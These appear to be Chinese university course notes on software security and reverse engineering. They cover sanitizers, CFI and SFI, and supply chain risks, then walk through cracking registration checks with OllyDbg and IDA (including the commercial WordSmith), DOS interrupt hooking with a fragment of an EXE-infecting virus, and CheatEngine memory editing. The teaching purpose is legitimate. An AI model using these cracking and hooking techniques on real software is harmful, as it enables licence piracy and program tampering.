<li><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">AddressSanitizer</a> (detects addressability issues) and <a href="https://github.com/google/sanitizers/wiki/AddressSanitizerLeakSanitizer">LeakSanitizer</a> (detects memory leaks)</li>
<li>ThreadSanitizer (detects data races and deadlocks) for <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual">C++</a> and <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerGoManual">Go</a></li>
<li><a href="https://github.com/google/sanitizers/wiki/MemorySanitizer">MemorySanitizer</a> (detects use of uninitialized memory)</li>
<li><a href="https://clang.llvm.org/docs/HardwareAssistedAddressSanitizerDesign.html">HWASAN</a>, or Hardware-assisted AddressSanitizer, a newer variant of AddressSanitizer that consumes much less memory</li>
<li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">UBSan</a>, or UndefinedBehaviorSanitizer</li>
</ul>
<p>如何检查代码覆盖率？</p>
<ul>
<li>llvm的SanitizerCoverage: https://clang.llvm.org/docs/SourceBasedCodeCoverage.html</li>
<li>gcc的Gcov: https://gcc.gnu.org/onlinedocs/gcc/Gcov.html</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="软件安全防护"><a class="header" href="#软件安全防护">软件安全防护</a></h1>
<p>这里介绍的防护思路，是就算软件存在漏洞，也让攻击者难以利用漏洞，或者利用漏洞能做的事情很少。</p>
<h2 id="cfi-control-flow-integrity"><a class="header" href="#cfi-control-flow-integrity">CFI: Control Flow Integrity</a></h2>
<p>Control Flow Guard</p>
<p>LLVM</p>
<p>Hardware Support: </p>
<ul>
<li>Shadow Stack</li>
<li>IBT: indirect branch tracking</li>
<li>PAC, Arm引入的</li>
</ul>
<h2 id="sfi-software-based-fault-isolation"><a class="header" href="#sfi-software-based-fault-isolation">SFI: Software-Based Fault Isolation</a></h2>
<p>如果可以做进程内部的隔离。可以防止，比如使用的库的漏洞造成整个软件的漏洞。</p>
<p>目前SFI的开销太大。</p>
<ul>
<li>对Data Region进行访问控制。</li>
<li>不允许某些代码区域执行系统调用。</li>
</ul>
<p>危险指令：内存读，内存写，跳转指令。SFI的思路是在危险指令前做Inforcement。</p>
<p>JIT，一边编译一边检查一边执行，这是做SFI的一种方法。</p>
<p>IRM，Inlined Reference Monitors。编译器检查。</p>
<p>检查内存范围，Data Guard</p>
<ol>
<li>
<p>naive做法： <code>if (addr &gt;= DR || addr &lt;= DB) goto fail</code>。有两个跳转。</p>
</li>
<li>
<p>Data Region Specialization: 比如DB = 0x12340000 ; DL = 0x1234FFFF</p>
<p><code>if (addr &gt;&gt; 16 != 0x1234) goto fail</code>。有一个跳转。</p>
</li>
<li>
<p>Address Masking: 比如DB = 0x12340000 ; DL = 0x1234FFFF</p>
<p><code>addr = addr &amp; 0xFFFF | 0x1234</code>。没有跳转。不过他只能保证说让你的内存读写在合法的Memory Region中，但是会对你程序的语义造成影响。</p>
</li>
<li>
<p>One-Instruction Address Mask：比如DB=0x20000000, DL=0x2000FFFF。</p>
<p><code>addr = addr &amp; 0x2000FFFF</code>。他基于这样的观察：0000XXXX是非法地址，访问会发生段错误。</p>
</li>
<li>
<p>还有和编译器紧密结合的一些优化方法。</p>
<ol>
<li>Guard Zone。基于这样一个观察，很多的寻址都是采用“基地址+偏移量”的模式。</li>
</ol>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="供应链安全"><a class="header" href="#供应链安全">供应链安全</a></h1>
<p>What is software supply chain?</p>
<ul>
<li>A software supply chain is <strong>anything that affects your software</strong></li>
<li>Nowadays, almost all software depend on software supply chain</li>
</ul>
<p>现在我们已经习惯于“调包”来避免重复造轮子。这里的包就是供应链的一部分。即使你不调包，那构建环境也是你的software supply chain。</p>
<p>第三方库，编译器，编译脚本，运行库，补丁，等等都会对你的程序安全造成影响，都是供应链安全的一部分。</p>
<blockquote>
<p>常用的Package Manager</p>
<ul>
<li>Java: Maven</li>
<li>Node: npm</li>
<li>Python: PyPI</li>
<li>Go: Modules</li>
<li>Rust: Cargo</li>
<li>.Net: NuGet</li>
<li>PHP: Composer</li>
</ul>
</blockquote>
<p>有一张很形象的图说明供应链状况：</p>
<p><img src="Basic/Secure/../images/image-20220605203445994-165503467401136.png" alt="image-20220605203445994" /></p>
<p>供应链安全主要要解决两个问题</p>
<ol>
<li>大规模的爬取数据</li>
<li>对代码进行分析</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse"><a class="header" href="#reverse">Reverse</a></h1>
<h2 id="lesson1-保护和破解的思路"><a class="header" href="#lesson1-保护和破解的思路">Lesson1 保护和破解的思路</a></h2>
<p>软件保护：对抗静态反编译和动态跟踪。</p>
<p>比如我们有一个比较密码的strcmp(input,password)
<strong>拿明文直接做比对一下子就破解了</strong>
引入一个加密函数f，对比较环节做改进。
strcmp(f(input),password)
这样子要破解这个软件，就需要看懂f求出$f^{-1}$。也可以暴力修改逻辑跳过。
90 90 nop nop</p>
<p><strong>但是，还要保护exe防止逻辑被修改。不能让别人跳过从而暴力破解。</strong>
保护的常用办法之一，可以对那一段代码进行加密。引入decode函数。
为了防止破解者找到检测介质的代码，需要对检测代码进行保护。保护的手段就是加壳。所谓加壳其实就是对检测代码进行加密，在运行时动态解密（decode函数）并执行。
获得函数f的地址————f
获得函数f的长度————在f后面弄一个没用的函数g,g-f
然后把中间的代码当做数组看待，对这一段关键代码设计解密函数，然后另外加密关键函数（可以用qv，当然也可以写一段脚本）。
源代码被加密，就不能静态分析（看不懂了）。
这样子，既让破解者不能暴力修改逻辑，也让静态分析失效。</p>
<p><strong>但是，如果decode函数被破解者发现，可以先执行decode，获得decode后的代码保存，禁用decode。</strong>
用OD里头的memory down插件可以保存动态运行后的代码。然后用QV编辑二进制代码。
这样，我就能还原出原来未被加密的代码。然后就可以静态分析啥啥的了。
所以我们需要反跟踪技术，可以在decode里加入反调试的手段：</p>
<ol>
<li>主动攻击：比如，抢占调试器（比如OD）的资源。这样能正常运行OD就不能正常运行decode，能正常运行decode就不能正常运行OD</li>
<li>decode可以对自己实现<strong>多层加密</strong>。（比如分成十层，一层加密下一层）</li>
<li>decode可以对自己进行<strong>虚拟机保护</strong>。把原本正常的指令变成一些奇怪的让人难以理解的指令。
参考：https://zhuanlan.zhihu.com/p/28176139</li>
</ol>
<h2 id="lesson2-软件破解和保护"><a class="header" href="#lesson2-软件破解和保护">Lesson2 软件破解和保护</a></h2>
<h3 id="软件保护方法分类根据介质划分"><a class="header" href="#软件保护方法分类根据介质划分">软件保护方法分类（根据介质划分）</a></h3>
<ol>
<li>
<p>已经成为历史————软盘指纹
杨道沅教授开发的LockUp，
他可以让计算机从保护模式强制返回实模式（怎么做到的？在dos中可以）
他通过在之前的代码作为秘钥解密之后的代码，这样子不可以设置软件断点（会把机器码首字节改成cc）
他把中断向量表都填满了，然你无法修改中断向量表（这样子怎么用中断？）
白老师————雷军的BitLock我用了一个小时就破解了</p>
</li>
<li>
<p>加密锁。<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8A%A0%E5%AF%86%E9%94%81/23647070?fromtitle=%E5%8A%A0%E5%AF%86%E9%94%81&amp;fromid=10131434&amp;fr=aladdin">参考链接一</a>
软件开发者可以通过接口函数和加密锁进行数据交换（即对加密锁进行读写），来检查加密锁是否插在接口上；或者直接用加密锁附带的工具加密自己EXE文件（俗称“包壳”）。
————可以替换加密锁中的读写函数（函数以lib形式提供给用户，可以在内存中替换）
————包壳目前难以破解</p>
</li>
<li>
<p>序列号。<a href="http://www.jeepxie.net/article/705362.html">参考链接一</a>
序列号跟机器特征码这个硬件信息有关。特征码通常跟网卡的mac地址、硬盘的序列号有关。
硬盘序列号有两种：
(1)卷标号（格式时产生，可以更改）
(2)固化在硬盘电路板上的序列号
Linux查看硬盘序列号：sudo hdparm -i /dev/sda。SerialNo</p>
</li>
</ol>
<h3 id="wordsmith的破解"><a class="header" href="#wordsmith的破解">WordSmith的破解</a></h3>
<p>弹窗切入口：DestroyWindow、messageBox；字符串比较
白老师的主页有教程。上课讲了另一种思路，从弹窗入手。</p>
<ul>
<li>DestroyWindows函数在注册码判断错误之后发生。我们从这里切入<strong>往前</strong>查找。</li>
<li>我们对我们输入的注册码的地址设一个硬件断点。我们从这里切入<strong>往后</strong>查找。</li>
<li>这样子确定起点和终点，确定查找范围。这样子比较好。</li>
</ul>
<p>检查传入的参数(push/reg)、返回值(rax)、变量名。
比如，发现用户的call，前面传入的参数就是关键信息，那么这个函数非常值得跟踪。回车进去看看。
对于WIN：注意内存的结构，高地址是系统内核函数，一般没必要跟踪。400开头的地址一般是用户代码区，跟踪价值大。</p>
<p>跟踪一个复杂的函数时，可以在call语句和下一条语句设两个断点，防止回不来。
回顾：使用函数的参数是[ebp+0xXX]，使用局部变量是[ebp-0xXX]，全局变量是[0xXX]
疑问：OD，符号表，是不是有什么联系。</p>
<p><strong>有时候判断失败没有弹窗提示，有时候判断和输入分离的很远甚至要重新启动。</strong>
有些软件在用户输入注册码后并不弹框，而是把注册码写入某个文件或者注册表，当软件重新运行时才对注册码进行判断。对于这种情形，可以尝试以下方法:
FileMon + RegMon = ProcMon
<a href="https://www.sysinternals.com">下载ProcMon</a></p>
<ol>
<li>RegMon工具可以监视软件向注册表里写了什么信息,再在以下函数上设断点进行跟踪:
<ul>
<li>RegCreateKey() 	打开注册表项</li>
<li>RegQueryValue() 	读注册表项</li>
<li>RegSetValue() 		写注册表项</li>
</ul>
</li>
<li>FileMon工具可以监视软件向文件写了什么信息，再在以下函数上设断点进行跟踪:
<ul>
<li>CreateFile 	打开文件</li>
<li>CreateFileEx</li>
<li>ReadFile    	读文件</li>
<li>WriteFile   	写文件</li>
</ul>
</li>
</ol>
<ul>
<li>第三种思路是设置<strong>消息断点</strong>：</li>
</ul>
<p>Windows是以消息驱动的系统。<a href="https://www.autohotkey.com/docs/misc/SendMessageList.htm">消息列表</a> <a href="https://www.cnblogs.com/skyofbitbit/p/3649104.html">消息机制分析</a></p>
<p>WM_xxxx，可以搜索API手册。或者在<a href="https://docs.microsoft.com/en-us/">MSDN</a>中搜索。</p>
<p>根据判断句柄，判断消息是不是我需要跟踪的。</p>
<p><strong>77D18731</strong>（Message Dispatcher），消息的分发中心。</p>
<p>我们需要观察传入的参数（push的参数，就在前面几条指令）结合手册对消息的参数说明设置条件断点。</p>
<p><strong>第一个参数是handle，参数2=消息的ID，参数3=wParam，参数4=lParam。</strong></p>
<p>例如WM_COMMAND，ID=111</p>
<pre><code class="language-c">//我们传入Message Dispatcher的参数是以下结构
//https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-msg
typedef struct tagMSG {
  HWND   hwnd;		//翻译做句柄，可以认为是一个对一个窗口的编号，我们通过这个验证我们是否选中了正确的元素
  UINT   message;	//消息的编号，我们需要过滤这个
  WPARAM wParam;	//参数，请查看手册对他的解释
  LPARAM lParam;	//参数，请查看手册对他的解释
  DWORD  time;		//时间，不太重要
  POINT  pt;
  DWORD  lPrivate;
} MSG, *PMSG, *NPMSG, *LPMSG;
</code></pre>
<p>然后消息被转移给用户定义的MessageHandler，怎么找这个Handler呢？因为他定义在用户的<strong>代码段(.text 或叫 .code)</strong>，我们可以在这个内存块右击设置内存访问断点，然后设置访问-执行。</p>
<h2 id="lesson3-破解工具的使用star"><a class="header" href="#lesson3-破解工具的使用star">Lesson3 破解工具的使用:star:</a></h2>
<h3 id="ollydbg动态跟踪"><a class="header" href="#ollydbg动态跟踪">OllyDbg(动态跟踪)</a></h3>
<p>win32调试利器，对于64位的程序可以用xdg。</p>
<p>找main:main不是最先被执行的，前面有初始化代码。</p>
<pre><code>    push eax 
    push [] 
    push []
    call -&gt; main
</code></pre>
<p>(如果IDA和OD位置一样，为什么要找main的特征？这个问题关乎到一个概念，叫做内存随机化。对于windows xp暂时没错，就是可以直接根据位置比对找。)
<img src="Basic/../images/1601969736130.png" alt="" /></p>
<h4 id="od使用技巧"><a class="header" href="#od使用技巧">OD使用技巧：</a></h4>
<ul>
<li>位移：选中call敲<code>Enter</code>，快速到达函数体。按<code>ESC</code>回退，<code>～</code>前进。</li>
<li>按<code>:</code>对地址添加标签，最好在标签里把地址也写上，不然就不好找了。不过只能在代码窗添加标签，所以即使是数字也要在代码窗里添加标签。<code>;</code>添加注释。</li>
<li>修改内存的内容
<ul>
<li>修改某个地址的指令，在代码窗选中直接输入汇编指令即可。</li>
<li>在数据窗修改变量的值，先选中首字节，按十六进制字符打开修改窗口，然后就可以修改了。</li>
</ul>
</li>
<li>想要修改寄存器的值，双击或直接输入十六进制字符（除了EIP寄存器，双击会定位到EIP）；想要修改EIP，点击代码窗选中位置，右击-此处为EIP。</li>
<li>上面说的三个修改的办法，都可以用<code>Alt+BackSpace</code>撤销。</li>
<li>检索内存：查看-内存-<code>Ctrl+B</code>-输入要查找的内容；</li>
<li><code>Ctrl+G</code>，跳转到特定内存地址，代码窗/内存窗/堆栈窗均可使用。</li>
<li>在内存中选中位置，右击可以添加硬件断点。</li>
<li><code>F9</code>继续执行（run），<code>F8</code>单步跳过（next），<code>F4</code>运行到此处（until），<code>F7</code>单步进入（step）。</li>
<li>查看窗口可以查看进程的很多属性
<ul>
<li>查看-窗口，OD会列出所有窗口的handle(句柄)，标题，以及父窗口。</li>
<li>查看-可执行模块，可以查看使用的库函数。</li>
<li>查看-断点，管理现在设置的软件断点。</li>
<li>查看-内存，查看内存segment的属性（感觉和<code>cat /proc/pid/maps</code>效果类似哈）</li>
<li>查看-CPU，核心模块，就是上面的那个窗口图片。</li>
</ul>
</li>
<li><code>Ctrl+A</code>重新分析。</li>
<li>memory dump: 这是一个插件。数据窗随便选几个字节-&gt;右击选择memory dump-&gt;Range dump(注意填入的长度是16进制)</li>
<li>断点分成三种：
<ul>
<li><code>F2</code>设置软件断点（break），<code>Shift+F2</code>设置条件断点，条件里面的数字默认是十六进制。通过把机器码改成cc可以实现。</li>
<li>内存断点：OD的内存断点有两类：写入，访问<strong>PAGE_NOACCESS</strong>。只能设置一个内存断点。内存断点的原理：内存断点的本质是修改页属性，触发页异常，走0E号中断。所以，我们可能只对一个字节设置断点，实际上整个Page都会触发异常，只不过OD会帮助我们判断是停止执行还是继续。所以会慢一点。</li>
<li>硬件断点：对于x86来说可以设置4个硬件断点，断点类型可以是访问、写入、执行。利用硬件提供的调试寄存器设置断点。</li>
</ul>
</li>
</ul>
<p>对于WIN：注意内存的结构，高地址是系统内核函数，一般没必要跟踪。400开头的地址一般是用户代码区，跟踪价值大。</p>
<p>让控制流从函数中回到调用者：</p>
<ol>
<li>查看堆栈中保存的返回地址 </li>
<li>单步跳过F8到retn</li>
<li>如果当前的函数是系统的API，按<code>Alt+F9</code>可以快速执行完API函数（或者说是返回到用户代码）；如果是用户的函数，按<code>Ctrl+F9</code>可以快速执行完函数。
（关于如何判断内核函数或是用户函数，简单来看可以看函数地址。一般来说用户函数地址前两位为0）</li>
</ol>
<h3 id="ida-pro静态反编译"><a class="header" href="#ida-pro静态反编译">IDA pro(静态反编译)</a></h3>
<p>C语言编译：任何函数或者全局变量在编译之后会在前面加上一个下划线，左侧快速定位
能识别出Lib函数调用名，OD不行。因为IDA把很多库函数的特征抽取形成一个数据库。
IDA支持多种CPU、多种编译器。</p>
<p><img src="Basic/../images/1611663723871.jpg" alt="" />
IDA使用技巧：</p>
<ul>
<li>按<code>F5</code>反汇编。虽然反汇编出的C语言也不一定好懂。</li>
<li><code>shift+F5</code>可以看到识别用的特征库。再按&quot;Insert&quot;加入特征库。FLAIR可以从第三方的.lib文件（<code>.lib</code>, a <a href="https://en.wikipedia.org/wiki/Static_library">static library</a> on Microsoft platforms）（比如从开源的库源代码编译得到）中抽取特征生成一个特征库.sig，然后拷贝到IDA目录下的sig文件夹里。</li>
<li><code>Alt+T</code>可以搜索字符串，可能是字符串（不要加双引号，否则会被当成字符串的一部分）也可能是变量名（变量名是哪里来的？？IDA可能会自动生成一些变量名）。换句话说，你在汇编代码窗口看到的字都可以搜到。</li>
<li><code>Alt+B</code>可以搜索十六进制串，搜字符串需要加双引号。这个是不会搜变量名的。换句话说，这个搜的是程序的数据。</li>
<li><strong>交叉引用（Cross reference）</strong> ，IDA会在注释自动生成引用了变量/函数的地方，双击或回车可以跳到相关语句（按<code>ESC</code>可以返回，<code>Ctrl+Enter</code>再前进）。如果交叉引用太多写不下了会加<code>...</code>，这时候“View-Open Subview-Cross Reference&quot;，打开交叉引用窗口。</li>
<li>选择一个标号时，相同的标号会高亮。（<em>puts static 编译 动态链接</em>？？）</li>
<li>对函数名、变量名进行重命名：选中，按<code>n</code></li>
<li>解释内存内容：IDA会自动的帮你识别代码、数据类型。
<ul>
<li>有时IDA在反编译的时候会弄错变量的宽度（所占字节数），用<code>Alt+D</code>可以设置变量的宽度。</li>
<li>有时IDA会发生错误，比如错误把数据当成了代码。这时可以
<ul>
<li>用<code>u</code>(undefined)可以让数据变成未定义的状态。按<code>c</code>可以强制转换成指令。（Code）</li>
<li>用<code>d</code>(data)可以让数据解释成数字类型。多按几次可以改变数字的宽度。</li>
<li>用<code>a</code>(ASCII)可以让数据解释成字符类型。</li>
<li>用<code>c</code>(code)可以让数据解释成汇编代码类型。</li>
<li>用<code>*</code>可以让数据解释成数组。</li>
</ul>
</li>
</ul>
</li>
<li>用<code>;</code>添加注释，就和汇编一样。</li>
<li>IDA也支持你自己编写插件。</li>
</ul>
<h3 id="quick-view修改二进制文件"><a class="header" href="#quick-view修改二进制文件">Quick View（修改二进制文件）</a></h3>
<p>在VC编译结果的exe，在内存中的地址，一般相差0x400000。</p>
<ul>
<li>
<p><code>F5</code> 定位 -&gt; 修改exe内容 -&gt; Alt-F9 保存（光标切换到机器码部分才能保存）。</p>
</li>
<li>
<p><code>F2</code> 切换16bits/32bits asm。</p>
</li>
<li>
<p><code>F8</code> 查看文件头，再<code>F3</code>查看各个section。</p>
</li>
<li>
<p><code>Enter</code> 切换视图。</p>
</li>
<li>
<p><code>Insert</code>可以选中/释放块，结合方向键；按住<code>shift</code>有很多对块的操作。</p>
</li>
</ul>
<p>在QV中修改汇编代码：回车切换到汇编视图（注意有16位模式和32位模式） -&gt; Tab在机器语言和汇编语言之间反复横跳。</p>
<p><strong>QV自带加密功能，加密过程：</strong>
选中需要解密的块(insert开始标记，insert结束标记) -&gt; F9 Crypt -&gt; 编程加密，上面是参数。ds:si 指向首字节，cx 指向长度，es:di 指向一个可用的临时数组 -&gt; F9 运行加密代码</p>
<p>选择一部分-按住<code>shift</code> =》 我们可以观察到下面的菜单变化了，再按F2可以保存选中的块 =》 选择Assemble类型保存，回车。</p>
<p><code>Alt+C</code>在EditPlus里可以列块选择。</p>
<h3 id="debug的用法dos调试"><a class="header" href="#debug的用法dos调试">debug的用法（DOS调试）</a></h3>
<p>debug是微软开发的调试工具。SoftIce和Windebug的使用方法和debug基本类似。</p>
<p>我不觉得学这玩意儿有啥用，Out Of date并且很弱。</p>
<div class="table-wrapper"><table><thead><tr><th>命令格式</th><th>含义</th></tr></thead><tbody>
<tr><td>p</td><td>单步执行(proceed): 相当于OD的F8</td></tr>
<tr><td>t</td><td>跟踪进入(trace into): 相当于OD的F7</td></tr>
<tr><td>r</td><td>观察所有寄存器当前的值</td></tr>
<tr><td>u 地址</td><td>查看从该地址开始的汇编代码</td></tr>
<tr><td>a 地址</td><td>从该地址开始输入汇编代码进行编程，其中a表示assemble即汇编(把汇编代码转成机器代码)。int 3相当于一个断点，它的机器码为0CCh。连续两次回车结束修改。</td></tr>
<tr><td>d 地址</td><td>查看从该地址开始的内存变量，其中d表示dump</td></tr>
<tr><td>e 地址</td><td>修改从地址起存放的变量的值。按下空格修改下一个地址的内容，按回车停止修改。</td></tr>
<tr><td>g=地址</td><td>从该地址开始运行程序</td></tr>
<tr><td>g 地址</td><td>表示运行到此处</td></tr>
<tr><td>q</td><td>退出debug</td></tr>
</tbody></table>
</div>
<h2 id="lesson4-调试"><a class="header" href="#lesson4-调试">Lesson4 调试</a></h2>
<h3 id="断点"><a class="header" href="#断点">断点</a></h3>
<ul>
<li><strong>硬件断点</strong>：CPU内部有断点寄存器，当我们设置硬件断点的时候，断点寄存器会保存这个断点的一些属性（比如地址、rwx读写执行，宽度）。显然，我们在代码段中一般设置x，数据段设置rw。我们一共只能设置4个断点。右击设置。参考链接 <a href="https://bbs.pediy.com/thread-248728.htm">硬件断点原理</a> </li>
<li><strong>内存块断点</strong>（内存访问、内存写入）：这个利用分页机制，通过改变page的RW权限来设置断点。右击设置。</li>
<li><strong>软件断点</strong>：用F2设置；把指令的首字节改成cc 。可以通过设置条件改成<strong>条件断点</strong>。
<ul>
<li>条件断点在OD的设置方法：右击-断点-条件（或者直接<code>Shift+F2</code>）输入条件表达式如<code>[esp+4]==111</code>(默认十六进制)</li>
</ul>
</li>
</ul>
<h3 id="破解白老师写的reverse2020"><a class="header" href="#破解白老师写的reverse2020">破解白老师写的reverse2020</a></h3>
<p><strong>思路：</strong></p>
<p>操作系统的版本老，没有随机化，程序的内存布局和进程的内存布局是对应的。也就是说IDA pro和OllyDBG的内存布局是对应的。</p>
<p>先用<code>Ctrl+G</code>寻找到DestroyWindow，在此处设置断点，让程序运行到此处。</p>
<p>然后观察堆栈，每个栈帧都标识着上一层的返回地址（OD里把一个个栈帧都标出来了）
观察调用链（忽略高地址的函数）：</p>
<p>4A4055 &lt;- 49010FC( SUB4A4028 ) &lt;- 401B0A( SUB48E07C ) &lt;- 401C16( SUB401AD0 ) &lt;- 4017A2(SUB4015F8) </p>
<p>在这些地方依次设置断点（堆栈中按<code>Enter</code>）运行，观察是否在点击按钮和弹出Bad之间断点生效。发现4017A2函数设置的断点生效，这个地址的指令在判断过程中间被执行。通过IDA和OD观察这个函数（<strong>sub4015f8</strong>），发现这个函数有重大嫌疑：</p>
<ul>
<li>中间有用到我的输入</li>
<li>中间有ASCII字符串bad</li>
<li>在这个函数中完成了弹窗</li>
</ul>
<p>所以下面对这个函数进行分析；从上到下有很多函数的调用，依次分析（后来才发觉可以在IDApro看看，并且反思的时候觉得或许应该关注地址较小的部分？）：</p>
<p>call 4d3d3c	@__InitExceptBlockLDTC，观察参数和返回值感觉没什么用</p>
<p>call 4A0AF8	一开始看返回值我以为是strlen之类的，IDA告诉我是getText()</p>
<p>call 4E0580	不知所云</p>
<p>call 4D5F8c	刚开始看到他把我的输入传进去了以为嫌疑很大，但是发现他其实是sscanf()函数，把我的输入读进去当做一个十六进制数，ebx指向着这个数字，在堆栈窗口中锁定<strong>ebx</strong>，观察后面代码中对ebx进行的操作。</p>
<p>然后就发现接下来的代码就是对我的输入进行计算了</p>
<p>call 4015d8,call 4015e8	是循环移动。还有加加减减，异或，最后再和MachineCode进行比较。</p>
<p>修改<code>cmp( edit_key , machinecode )</code>之后的Zflag，发现弹窗Good。成功。</p>
<p>接下来就是把加密部分反过来变成解密部分写代码了。</p>
<p><strong>疑问：</strong></p>
<ol>
<li>这里有很多似乎是库函数的东西出现在了.text段的高地址处，这个是因为我们的程序在编译的过程中使用了静态链接吗？是的。那还是有些函数在7开头的高地址？还是使用了动态链接的。这个自己怎么动手复现一下？VC中有选项。</li>
<li>有一个全都是jmp的地方（004E07A4开始），这是什么呢？看起来好像和WindowsAPI的调用有关系，是类似于全局跳转表之类的东西吗？</li>
</ol>
<h2 id="lesson5-控制流和内存修改star"><a class="header" href="#lesson5-控制流和内存修改star">Lesson5 控制流和内存修改:star:</a></h2>
<h3 id="dos中断修改"><a class="header" href="#dos中断修改">DOS中断修改</a></h3>
<ul>
<li>
<p>TF：跟踪标志，陷阱标志(Trace/Trap Flag)  若<strong>执行一条指令前TF为1</strong>，CPU在<strong>执行一条指令后</strong>，产生单步中断int 1，进入int 1对应的中断处理程序。我们通过修改Int 1中断向量抢占调试器的资源、指令加密解密。</p>
</li>
<li>
<p>我们如果修改中断向量表对应的函数，（比如时钟中断int 8，键盘中断int 9）我们就可以在产生时钟中断的时候执行我们自己的命令。比如可以<em>锁血挂</em>。homework2。</p>
</li>
</ul>
<p>修改中断一般有两种模式：</p>
<ul>
<li>中断链接模式，在执行完我们的中断处理代码之后控制流在回到老的中断代码</li>
<li>中断替换模式，执行完，记得给中断控制器发信号，直接iret。</li>
<li>第三种模式，一个病毒的例子
<pre><code>   pushf
   push cs
   mov ax, offset returnhere
   push ax
   jmp dword ptr cs:[old21h]; 模拟int 21h
returnhere:
   ...; 判断EXE、感染EXE
   jmp dword ptr cs:[old21h]
</code></pre>
</li>
</ul>
<p>基本思路：</p>
<pre><code>安装程序：
    保存原来的中断向量CS：IP
    cli 	;禁用中断
    修改原来的中断向量，指向我们的中断程序位置
    sti 	;允许中断

;如果设置了取消条件，那么之后再把中断向量恢复。
;如果要求程序驻留，需要用到AH=31h,int 21。而且要注意你能用的段寄存器只有CS。

中断程序：
	保存所有用到的寄存器
	程序主体
	恢复所有用到的寄存器
	iret(或者jmp到老的中断向量上，它里面肯定有iret)
</code></pre>
<p>Demo:</p>
<ul>
<li><a href="http://10.71.45.100/bhh/autotime.asm">时钟中断程序</a></li>
<li><a href="http://10.71.45.100/bhh/key.asm">键盘中断程序</a></li>
<li><a href="http://10.71.45.100/bhh/int1dec0.asm">单步中断程序</a></li>
</ul>
<h3 id="win32内存修改"><a class="header" href="#win32内存修改">WIN32内存修改</a></h3>
<p><a href="https://www.cheatengine.org/">CheatEngine</a>是一个开源、强大的外挂工具。他可以对内存的值扫描，进行精确或者模糊的分析。</p>
<p>然后可以修改内存的值、冻结内存的值。甚至还可以对内存下断点。这个东西几乎就是一个调试器。</p>
<p>首先open目标进程，<code>scan value</code>寻找内存，找到之后可以右键add to list保存下来，对这个内存做冻结、修改等操作。我们还可以debug。</p>
<p>Microsoft Spy++可以查看目标窗口的Class和Title，这个可以作为<code>FindWIndow</code>的参数让我们找到窗口的handle。使用方法：<code>Search-FindWindow</code>。</p>
<div class="table-wrapper"><table><thead><tr><th>WIN32API（参数参考<a href="https://docs.microsoft.com/en-us/documentation/">MicroSoft官方文档</a>）</th><th>作用</th></tr></thead><tbody>
<tr><td>GetWindowThreadProcessId</td><td>根据窗口的句柄，返回窗口所在进程的进程号</td></tr>
<tr><td>OpenProcess</td><td>获得Process的Handle</td></tr>
<tr><td>ReadProcessMemory</td><td>读取其他进程的地址</td></tr>
<tr><td>WriteProcessMemory</td><td>写其他进程的地址（Any process that has a handle with PROCESS_VM_WRITE and PROCESS_VM_OPERATION access to the process to be written to can call the function.）安全？</td></tr>
<tr><td>FindWIndow</td><td>根据窗口的类和名称，找到窗口的句柄</td></tr>
<tr><td>VirtualProtectEx</td><td>可以修改内存的rwx权限</td></tr>
</tbody></table>
</div>
<h3 id="win32的单步-一个奇怪的技术"><a class="header" href="#win32的单步-一个奇怪的技术">WIN32的单步-一个奇怪的技术</a></h3>
<p>和现在的操作系统一样，中断表已经被操作系统保护好了，不能被我更改了。</p>
<p>SEH（Self Exception Handler），也就是用户程序可以自己处理自己的异常。
关于SEH的原理，可以参考这两个链接：http://blog.csdn.net/chenlycly/article/details/52575260； https://www.microsoft.com/msj/0197/exception/exception.aspx
所以和DOS一样，我们也可以利用这个特性来单步中断加密解密程序。
另外，text section默认是不可写的，我们要在编译的时候加选项运行RWX。
通过写这个结构就能改变寄存器吗。</p>
<h2 id="lesson6-dos-mz文件格式"><a class="header" href="#lesson6-dos-mz文件格式">Lesson6 DOS MZ文件格式</a></h2>
<h3 id="mz文件头"><a class="header" href="#mz文件头">MZ文件头</a></h3>
<p><img src="Basic/../images/1611718817364.jpg" alt="" /></p>
<div class="table-wrapper"><table><thead><tr><th>偏移</th><th>长度</th><th>含义</th></tr></thead><tbody>
<tr><td>0x 0</td><td>2</td><td>4D 5A这个Magic Number表示可执行文件</td></tr>
<tr><td>0x2</td><td>4</td><td>4-5表示扇区数量(1个扇区512字节)，2-3表示最后一个扇区的实际使用字节(不过全0表示全用) 我们为什么要在文件头保存大小呢？文件系统里不是都有保存吗？但事实上文件头描述的长度是载入到内存的大小(除了文件头部分)，对于某些过大无法一次性载入的程序，可能采用“覆盖”技术一部分内容并不载入内存。</td></tr>
<tr><td>0x6</td><td>2</td><td>重定位项数</td></tr>
<tr><td>0x8</td><td>2</td><td>文件头的节长度=20h，字节长度200h</td></tr>
<tr><td>0xA</td><td>2</td><td>至少需要为exe分配的内存节长度</td></tr>
<tr><td>0xC</td><td>2</td><td>至多需要为exe分配的内存节长度</td></tr>
<tr><td>0xE</td><td>2</td><td>SS地址（注意这里所有的段地址都是相对地址）</td></tr>
<tr><td>0x10</td><td>2</td><td>SP的值</td></tr>
<tr><td>0x12</td><td>2</td><td>EXE校验值</td></tr>
<tr><td>0x14</td><td>4</td><td>Entry Point，CS：IP（先IP再CS）</td></tr>
<tr><td>0x18</td><td>2</td><td>重定位表偏移位置</td></tr>
<tr><td>重定位表</td><td></td><td>重定位表每一项指向需要重定位的段地址和偏移地址。每一项4个字节。</td></tr>
</tbody></table>
</div>
<p>dos在完成重定位后，设置<code>ds=es=psp</code>，设置<code>ss:sp</code>的值，再<code>jmp cs:ip</code>。在DOS中重定位很简单，就是加上首段的地址。</p>
<h3 id="dos壳"><a class="header" href="#dos壳">DOS壳</a></h3>
<p>壳是用来对抗静态调试的利器，对于动态调试也可以加大难度。
第三次的作业是简单的DOS程序壳的编写。首先是加密程序，这个问题不是很大。就是 加密+加上脱壳程序+修改文件头。
然后是添加上脱壳程序，这个程序还是有挺多tricky的。不过DOS壳的简单之处，在于没有什么动态链接、权限保护这些复杂的东西。脱壳要做的事情主要是：解密程序+返回到原来的程序。
主要问题是两个定位：
A：正确定位我在脱壳程序使用的变量。因为脱壳程序连接到了源程序上，原先的定位方式已经不准确了。
